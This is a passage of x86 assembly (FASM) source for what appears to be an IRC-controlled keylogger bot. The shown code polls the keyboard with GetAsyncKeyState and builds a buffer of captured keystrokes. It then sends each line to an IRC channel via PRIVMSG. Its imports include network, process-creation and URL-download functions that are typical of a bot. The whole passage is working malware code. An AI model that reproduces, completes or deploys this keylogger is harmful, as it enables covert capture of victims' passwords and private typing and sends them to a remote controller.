        cmp ebx, 64h                                            ;VK_NUMPAD4
        je IsNumpad4                                            ;if it is this key, jump there

        cmp ebx, 65h                                            ;VK_NUMPAD5
        je IsNumpad5                                            ;if it is this key, jump there

        cmp ebx, 66h                                            ;VK_NUMPAD6
        je IsNumpad6                                            ;if it is this key, jump there

        cmp ebx, 67h                                            ;VK_NUMPAD7
        je IsNumpad7                                            ;if it is this key, jump there

        cmp ebx, 68h                                            ;VK_NUMPAD8
        je IsNumpad8                                            ;if it is this key, jump there

        cmp ebx, 69h                                            ;VK_NUMPAD9
        je IsNumpad9                                            ;if it is this key, jump there

        cmp ebx, 0Dh                                            ;VK_RETURN
        je IsReturn                                             ;if it is this key, jump there

        cmp ebx, 30h                                            ;VK_0
        jae CheckIsKey                                          ;if its above "1" its possible key

ScanNextKey:                                                    ;check next key if its pressed
        inc ebx                                                 ;increase counter by one
        jmp NextKey                                             ;check it baby

CheckIsKey:
        cmp ebx, 5Ah                                            ;VK_Z
        jbe IsKey                                               ;is key from 1 - Z

        jmp ScanNextKey                                         ;nop, scan next one

IsSpace:                                                        ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                " "

        jmp LiveKeylog

IsBack:                                                         ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "{back}"

        jmp LiveKeylog

IsTab:                                                          ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "{tab}"

        jmp LiveKeylog

IsNumpad0:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "0"

        jmp LiveKeylog

IsNumpad1:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "1"

        jmp LiveKeylog

IsNumpad2:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "2"

        jmp LiveKeylog

IsNumpad3:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "3"

        jmp LiveKeylog

IsNumpad4:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "4"

        jmp LiveKeylog

IsNumpad5:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "5"

        jmp LiveKeylog

IsNumpad6:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "6"

        jmp LiveKeylog

IsNumpad7:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "7"

        jmp LiveKeylog

IsNumpad8:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "8"

        jmp LiveKeylog

IsNumpad9:                                                      ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "9"

        jmp LiveKeylog

IsReturn:                                                       ;cat other key to buffer
        invoke lstrcat,\
                KeylogBuffer,\
                "{crlf}"

        jmp LiveKeylog

IsKey:                                                          ;cat key to buffer
        mov dword [ByteBuffer], ebx                             ;key is in ebx

        invoke lstrcat,\                                        ;append it to the keylog buffer
                KeylogBuffer,\                                  ;to this
                ByteBuffer                                      ;the logged key

        jmp LiveKeylog                                          ;log next key

SendKeyLine:
        invoke lstrcpy,\                                        ;send complete line to channel
                SendBuffer,\                                    ;copy to send buffer
                "PRIVMSG "                                      ;irc command

        invoke lstrcat,\                                        ;append channel
                SendBuffer,\                                    ;to buffer
                Channel                                         ;this

        invoke lstrcat,\                                        ;cat :
                SendBuffer,\                                    ;to buffer
                " :"                                            ;guess

        invoke lstrcat,\                                        ;append logged buffer
                SendBuffer,\                                    ;to send buffer
                KeylogBuffer                                    ;from here

        call SendLine                                           ;send line to irc server

        mov dword [KeylogBuffer], 0                             ;empty buffer
        jmp LiveKeylog                                          ;log next

ret                                                             ;return to call


section '.idata' import data readable writeable                 ;imports
        library kernel,                 "kernel32.dll",\
                winsock,                "ws2_32.dll",\
                user,                   "user32.dll",\
                advapi,                 "advapi32.dll",\
                wininet,                "wininet.dll"

        import kernel,\
                lstrcpy,                "lstrcpyA",\
                lstrcpyn,               "lstrcpynA",\
                lstrcat,                "lstrcatA",\
                lstrcmp,                "lstrcmpA",\
                lstrlen,                "lstrlenA",\
                GetTickCount,           "GetTickCount",\
                Sleep,                  "Sleep",\
                CreateFile,             "CreateFileA",\
                WriteFile,              "WriteFile",\
                CloseHandle,            "CloseHandle",\
                CreateProcess,          "CreateProcessA",\
                CreateThread,           "CreateThread",\
                GetExitCodeThread,      "GetExitCodeThread",\
                TerminateThread,        "TerminateThread",\
                GetSystemDirectory,     "GetSystemDirectoryA",\
                ExitProcess,            "ExitProcess"

        import winsock,\
                WSAStartup,             "WSAStartup",\
                socket,                 "socket",\
                inet_addr,              "inet_addr",\
                htons,                  "htons",\
                connect,                "connect",\
                recv,                   "recv",\
                send,                   "send",\
                WSACleanup,             "WSACleanup"

        import advapi,\
                GetUserName,            "GetUserNameA"

        import user,\
                CharLowerBuff,          "CharLowerBuffA",\
                MessageBox,             "MessageBoxA",\
                GetAsyncKeyState,       "GetAsyncKeyState"

        import wininet,\
                InternetOpen,           "InternetOpenA",\
                InternetOpenUrl,        "InternetOpenUrlA",\
                InternetReadFile,       "InternetReadFile",\
                InternetCloseHandle,    "InternetCloseHandle"
  